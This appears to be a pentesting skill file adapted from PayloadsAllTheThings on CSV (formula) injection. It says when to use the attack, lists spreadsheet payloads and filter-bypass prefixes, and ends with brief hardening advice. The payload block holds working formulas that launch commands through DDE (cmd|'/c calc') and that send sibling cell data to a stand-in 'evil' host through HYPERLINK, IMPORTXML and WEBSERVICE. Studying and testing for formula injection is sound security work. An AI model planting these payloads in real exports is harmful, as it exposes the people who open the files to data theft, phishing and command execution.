---
name: csv-injection
description: Inject spreadsheet formulas into exported CSV/XLSX to achieve RCE, data exfiltration, or hyperlink phishing when victims open the file in Excel/LibreOffice
domain: cybersecurity
subdomain: web-application-security
tags: [csv-injection, formula-injection, excel, dde]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/CSV Injection
---

# CSV (Formula) Injection

## Overview
User input rendered into a CSV that downstream users open in Excel/LibreOffice/Numbers becomes executable formula content when starting with `=`, `+`, `-`, `@`, tab, or CR.

## When to Use
Any "Export to CSV/XLSX" feature where attacker-controlled values land in cells: user-submitted names, comments, support tickets, audit logs.

## Payloads
```
=1+1
=cmd|'/c calc'!A1                       # legacy DDE, prompts user
=HYPERLINK("https://evil/?d=" & A1, "Open")    # exfil + phish click
=IMPORTXML("https://evil/x?d=" & A1, "//a")    # Google Sheets exfil (no prompt!)
=WEBSERVICE("https://evil/?d=" & A1)           # Excel >= 2013
@SUM(1+9)*cmd|'/c calc'!A0
+1+1
-1+1
```
Prefix-trick variants that bypass simple `=`-only filters: leading whitespace, tab `\t=`, `\r=`.

## Impact
- DDE → command execution (older Office or with "enable content").
- `HYPERLINK` → phishing click that leaks cell data via URL.
- Google Sheets `IMPORTXML/IMPORTDATA/IMPORTFEED` → silent exfil of sibling cells.

## Hardening
- Prefix any cell starting with `= + - @ \t \r` with a single quote `'` (cell becomes text).
- Or wrap in `"`-quotes and prefix with `'`.
- Set Excel `WorkbookConnection` / `DDEAllowed` off via GPO.
- For Google Sheets exports, prefix tab/CR too.

## References
- `payloadsallthethings/CSV Injection/README.md`
- OWASP: CSV Injection.
